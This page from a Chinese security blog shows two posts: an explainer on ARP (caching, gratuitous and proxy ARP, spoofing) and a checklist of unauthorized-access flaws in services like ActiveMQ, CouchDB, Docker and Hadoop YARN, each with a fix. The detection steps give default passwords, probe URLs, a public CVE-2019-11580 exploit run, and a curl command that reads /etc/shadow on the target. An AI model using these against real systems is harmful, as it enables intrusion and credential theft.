<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="欢迎">
<meta property="og:type" content="website">
<meta property="og:title" content="kilig&#39;s Blog">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="kilig&#39;s Blog">
<meta property="og:description" content="欢迎">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="kiligwh">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>kilig's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">kilig's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">If it is a rose,it will blossom</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="kiligwh"
      src="/images/kilig.gif">
  <p class="site-author-name" itemprop="name">kiligwh</p>
  <div class="site-description" itemprop="description">欢迎</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">41</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/02/ARP%E5%8D%8F%E8%AE%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/01/02/ARP%E5%8D%8F%E8%AE%AE/" class="post-title-link" itemprop="url">ARP协议</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-01-02 13:40:50" itemprop="dateCreated datePublished" datetime="2023-01-02T13:40:50+08:00">2023-01-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><hr>
<h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><p>在以太网中，一个主机和另一个主机进行直接通信，必须要知道目标主机的MAC地址。</p>
<p>但目标主机MAC地址如何获取呢？</p>
<p>通过ARP（地址解析协议）获取，所谓地址解析就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Address Resolution Protocol 地址解析协议</p>
<p>ARP协议是用来实现以太网中IP地址与MAC地址之间的映射，是以太网通信的基础</p>
<blockquote>
<p>作用</p>
</blockquote>
<p>将IP地址解析为MAC地址</p>
<p>数据在以太链路上以以太网帧的形式传输，要在以太网中传输IP数据包，必须知道IP对应的MAC地址</p>
<p><img src="/Image%5CARP1-Chinese%5C2024101713174132.png" alt="ARP协议数据传输"></p>
<blockquote>
<p>解析过程</p>
</blockquote>
<p><img src="/Image%5CARP1-Chinese%5C2024101713174136.png" alt="ARP协议解析过程"></p>
<h2 id="ARP缓存"><a href="#ARP缓存" class="headerlink" title="ARP缓存"></a>ARP缓存</h2><blockquote>
<p>动态表项</p>
</blockquote>
<p>通过ARP协议学习，能被更新，缺省老化时间120s</p>
<blockquote>
<p>静态表项</p>
</blockquote>
<p>手工配置，不能被更新，无老化时间的限制</p>
<p>注意：当存在ARP欺骗时，会用到静态表项</p>
<blockquote>
<p>栗子</p>
</blockquote>
<p><img src="/Image%5CARP1-Chinese%5C2024101713174152.png" alt="null"></p>
<h2 id="APR报文"><a href="#APR报文" class="headerlink" title="APR报文"></a>APR报文</h2><p><img src="/Image%5CARP1-Chinese%5C2024101713174256.png" alt="null"></p>
<p><img src="/Image%5CARP1-Chinese%5C2024101713174258.png" alt="null"></p>
<h2 id="传输过程"><a href="#传输过程" class="headerlink" title="传输过程"></a>传输过程</h2><blockquote>
<p>局域网中数据包传输的整个过程</p>
</blockquote>
<p>先查本机的ARP缓存表，如果没有发送ARP广播，ARP收到回复，填写目的MAC地址，然后发送数据包，同时更新本机ARP缓存表</p>
<blockquote>
<p>跨局域网的数据包传输的整个过程</p>
</blockquote>
<p>先查本机ARP缓存表–&gt;如果没有发送ARP广播（默认路由IP）–&gt;ARP收到回复–&gt;填写网关目的MAC地址–&gt;发送数据包–&gt;网关根据目的IP进行路由–&gt;网关先查自己的ARP缓存表–&gt;如果没有，发送ARP广播（目的IP）–&gt;ARP收到回复–&gt;发送数据包，同时更新自己ARP缓存表</p>
<h2 id="免费ARP"><a href="#免费ARP" class="headerlink" title="免费ARP"></a>免费ARP</h2><p>免费ARP Gratuitous ARP ，是广播报文</p>
<p>Gratuitous ARP中的报文，它的源、目标的IP是一样的，目的是为了再次确认网络</p>
<blockquote>
<p>栗子</p>
</blockquote>
<p>我们的PC，开机或者更改了IP地址，会发送免费ARP</p>
<p>发送ARP请求，其中Target IP是自己的IP</p>
<ul>
<li>确定其它设备的 IP地址是否与本机 IP地址冲突</li>
<li>更改了地址，通知其他设备更新 ARP表项</li>
</ul>
<blockquote>
<p>主机或网络设备如何盘判断IP冲突</p>
</blockquote>
<p>当没有DHCP服务时，需要手工配置IP地址</p>
<p>IP地址发生冲突的条件：收到Gratuitous ARP报文，且Sender&#x2F;Target IP与当前IP一致，但Sender MAC与当前MAC不同</p>
<p><img src="/Image%5CARP1-Chinese%5C2024101713174291.png" alt="null"></p>
<p><img src="/Image%5CARP1-Chinese%5C2024101713174293.png" alt="null"></p>
<h2 id="代理ARP"><a href="#代理ARP" class="headerlink" title="代理ARP"></a>代理ARP</h2><p>proxy arp是为了分割网络，同时又不想划分网段，中间加设一个路由设备并开启arp代理功能，就能通过 router代为回应双方的arp请求和应答</p>
<p>由启动了代理ARP功能的网关&#x2F;下一跳设备代为应答ARP请求，该ARP请求的是其他IP对应的MAC地址</p>
<blockquote>
<p>回应ARP请求的条件</p>
</blockquote>
<p>本地有去往目的IP的路由表</p>
<p>收到该ARP请求的接口与路由表下一跳不是同一个接口</p>
<blockquote>
<p>ARP代理工作过程</p>
</blockquote>
<p><img src="/Image%5CARP1-Chinese%5C20241017131743109.png" alt="null"></p>
<h2 id="RARP概述"><a href="#RARP概述" class="headerlink" title="RARP概述"></a>RARP概述</h2><p>Reverse Address Resolution Protocol 反向地址解析协议</p>
<p>作用：把MAC地址解析为IP地址</p>
<p>场景：常用于无盘工作站</p>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>ARP欺骗（ARP spoofing）又称为ARP毒化或ARP攻击，是针对 以太网地址解析攻击，通过欺骗局域网内的访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通</p>
<blockquote>
<p>攻击效果</p>
</blockquote>
<p>攻击者可以获取局域网上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/21/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/kilig.gif">
      <meta itemprop="name" content="kiligwh">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kilig's Blog">
      <meta itemprop="description" content="欢迎">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | kilig's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/12/21/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">未授权访问漏洞总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-12-21 15:41:16" itemprop="dateCreated datePublished" datetime="2022-12-21T15:41:16+08:00">2022-12-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p>
<h2 id="0x01-未授权漏洞预览"><a href="#0x01-未授权漏洞预览" class="headerlink" title="0x01 未授权漏洞预览"></a>0x01 未授权漏洞预览</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Active MQ 未授权访问</span><br><span class="line">Atlassian Crowd 未授权访问</span><br><span class="line">CouchDB 未授权访问</span><br><span class="line">Docker 未授权访问</span><br><span class="line">Dubbo 未授权访问</span><br><span class="line">Druid 未授权访问</span><br><span class="line">Elasticsearch 未授权访问</span><br><span class="line">FTP 未授权访问</span><br><span class="line">Hadoop 未授权访问</span><br><span class="line">JBoss 未授权访问</span><br><span class="line">Jenkins 未授权访问</span><br><span class="line">Jupyter Notebook 未授权访问</span><br><span class="line">Kibana 未授权访问</span><br><span class="line">Kubernetes Api Server 未授权访问</span><br><span class="line">LDAP 未授权访问</span><br><span class="line">MongoDB 未授权访问</span><br><span class="line">Memcached 未授权访问</span><br><span class="line">NFS 未授权访问</span><br><span class="line">Rsync 未授权访问</span><br><span class="line">Redis 未授权访问</span><br><span class="line">RabbitMQ 未授权访问</span><br><span class="line">Solr 未授权访问</span><br><span class="line">Spring Boot Actuator 未授权访问</span><br><span class="line">Spark 未授权访问</span><br><span class="line">VNC 未授权访问</span><br><span class="line">Weblogic 未授权访问</span><br><span class="line">ZooKeeper 未授权访问</span><br><span class="line">Zabbix 未授权访问</span><br></pre></td></tr></table></figure>

<h2 id="0x02-Active-MQ-未授权访问"><a href="#0x02-Active-MQ-未授权访问" class="headerlink" title="0x02 Active MQ 未授权访问"></a>0x02 Active MQ 未授权访问</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h3><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>默认端口：8161</p>
<p>默认密码：admin&#x2F;admin</p>
<p><img src="/Image-Chinese%5C2024101713120361.png" alt="img"></p>
<h3 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>针对未授权访问，可修改conf&#x2F;jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务即可。</li>
<li>针对弱口令，可修改conf&#x2F;jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可。</li>
</ul>
<blockquote>
<p>参考文章 <a target="_blank" rel="noopener" href="https://www.ouyangxiaoze.com/2020/08/631.html">https://www.ouyangxiaoze.com/2020/08/631.html</a></p>
</blockquote>
<h2 id="0x03-Atlassian-Crowd-未授权访问"><a href="#0x03-Atlassian-Crowd-未授权访问" class="headerlink" title="0x03 Atlassian Crowd 未授权访问"></a>0x03 Atlassian Crowd 未授权访问</h2><h3 id="1-漏洞简介-1"><a href="#1-漏洞简介-1" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。</p>
<p>Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码&#x2F;命令，从而获得服务器权限。</p>
<h3 id="2-漏洞检测-1"><a href="#2-漏洞检测-1" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>漏洞利用脚本github地址：<a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jas502n/CVE-2019-11580</span><br><span class="line"><span class="built_in">cd</span> CVE-2019-11580/</span><br><span class="line">python CVE-2019-11580.py http://192.168.18.138:8095</span><br><span class="line">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=<span class="built_in">cat</span>%20/etc/shadow</span><br></pre></td></tr></table></figure>

<h3 id="3-漏洞修复-1"><a href="#3-漏洞修复-1" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>设置访问&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action的源ip。</li>
<li>升级最新版本(3.5.0以上)。</li>
</ul>
<h2 id="0x04-CouchDB-未授权访问"><a href="#0x04-CouchDB-未授权访问" class="headerlink" title="0x04 CouchDB 未授权访问"></a>0x04 CouchDB 未授权访问</h2><h3 id="1-漏洞简介-2"><a href="#1-漏洞简介-2" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>
<p>在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。</p>
<h3 id="2-漏洞检测-2"><a href="#2-漏洞检测-2" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞环境用于测试演示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/couchdb/CVE-2017-12636</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>未授权访问测试命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.126.130:5984</span><br><span class="line">curl 192.168.126.130:5984/_config</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131203118.png" alt="img"></p>
<h3 id="3-漏洞修复-2"><a href="#3-漏洞修复-2" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 文件中找到 “bind_address &#x3D; 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。<br>注：修改后只有本机才能访问CouchDB。</li>
<li>设置访问密码（需要重启CouchDB才能生效）在 &#x2F;etc&#x2F;couchdb&#x2F;local.ini 中找到“[admins]”字段配置密码。</li>
<li>设置WWW-Authenticate，强制认证。</li>
</ul>
<h2 id="0x05-Docker-未授权访问"><a href="#0x05-Docker-未授权访问" class="headerlink" title="0x05 Docker 未授权访问"></a>0x05 Docker 未授权访问</h2><h3 id="1-漏洞简介-3"><a href="#1-漏洞简介-3" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/45905.html">Docker API 未授权访问漏洞分析和利用</a></li>
</ul>
<h3 id="2-漏洞检测-3"><a href="#2-漏洞检测-3" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞环境用于测试演示</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/docker/unauthorized-rce</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>直接输入地址 <code>http://your-ip:2375/version</code> ；若能访问，证明存在未授权访问漏洞。</p>
<p><img src="/Image-Chinese%5C20241017131204147.png" alt="img"></p>
<h3 id="3-漏洞修复-3"><a href="#3-漏洞修复-3" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>对2375端口做网络访问控制，如ACL控制，或者访问规则；</li>
<li>修改docker swarm的认证方式，使用TLS认证；</li>
</ul>
<h2 id="0x06-Dubbo-未授权访问"><a href="#0x06-Dubbo-未授权访问" class="headerlink" title="0x06 Dubbo 未授权访问"></a>0x06 Dubbo 未授权访问</h2><h3 id="1-漏洞简介-4"><a href="#1-漏洞简介-4" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。</p>
<h3 id="2-漏洞检测-4"><a href="#2-漏洞检测-4" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>连接进入dubbo 服务，进行操作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telent IP port</span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131204168.png" alt="img"></p>
<p><img src="/Image-Chinese%5C20241017131204170.png" alt="img"></p>
<h3 id="3-漏洞修复-4"><a href="#3-漏洞修复-4" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>配置dubbo认证；</li>
<li>设置防火墙策略，限定IP访问；</li>
</ul>
<h2 id="0x07-Druid-未授权访问"><a href="#0x07-Druid-未授权访问" class="headerlink" title="0x07 Druid 未授权访问"></a>0x07 Druid 未授权访问</h2><h3 id="1-漏洞简介-5"><a href="#1-漏洞简介-5" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p>
<h3 id="2-漏洞检测-5"><a href="#2-漏洞检测-5" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接在网站的url中后加上：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/datasource.html</span><br><span class="line">/druid/sql.html</span><br><span class="line">/druid/spring.html</span><br></pre></td></tr></table></figure>

<p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
<p><img src="/Image-Chinese%5C20241017131204197.png" alt="img"></p>
<h3 id="3-漏洞修复-5"><a href="#3-漏洞修复-5" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>配置访问账号密码；</li>
<li>禁止对外网开放访问；</li>
</ul>
<h2 id="0x08-Elasticsearch-未授权访问"><a href="#0x08-Elasticsearch-未授权访问" class="headerlink" title="0x08 Elasticsearch 未授权访问"></a>0x08 Elasticsearch 未授权访问</h2><h3 id="1-漏洞简介-6"><a href="#1-漏洞简介-6" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。</p>
<h3 id="2-漏洞检测-6"><a href="#2-漏洞检测-6" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>未授权访问测试命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9200/_cat/indices</span><br><span class="line">http://localhost:9200/_river/_search <span class="comment">#查看数据库敏感信息</span></span><br><span class="line">http://localhost:9200/_nodes <span class="comment">#查看节点数据</span></span><br></pre></td></tr></table></figure>

<p><img src="/Image-Chinese%5C20241017131205220.png" alt="img"></p>
<h3 id="3-漏洞修复-6"><a href="#3-漏洞修复-6" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>访问控制策略，限制IP访问，绑定固定IP；</li>
<li>在config&#x2F;elasticsearch.yml中为9200端口设置认证等；</li>
</ul>
<h2 id="0x09-FTP-未授权访问"><a href="#0x09-FTP-未授权访问" class="headerlink" title="0x09 FTP 未授权访问"></a>0x09 FTP 未授权访问</h2><h3 id="1-漏洞简介-7"><a href="#1-漏洞简介-7" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。</p>
<h3 id="2-漏洞检测-7"><a href="#2-漏洞检测-7" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>直接访问ftp路径：<code>ftp://ip:port/</code></p>
<p><img src="/Image-Chinese%5C20241017131205237.png" alt="img"></p>
<h3 id="3-漏洞修复-7"><a href="#3-漏洞修复-7" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h3><ul>
<li>禁止匿名登录；</li>
<li>配置强密码，密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体；</li>
</ul>
<h2 id="0x10-HadoopYARN-未授权访问"><a href="#0x10-HadoopYARN-未授权访问" class="headerlink" title="0x10 HadoopYARN 未授权访问"></a>0x10 HadoopYARN 未授权访问</h2><h3 id="1-漏洞简介-8"><a href="#1-漏洞简介-8" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。</p>
<p>此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。</p>
<h3 id="2-漏洞检测-8"><a href="#2-漏洞检测-8" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>使用vulhub搭建漏洞演示环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/hadoop/unauthorized-yarn</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

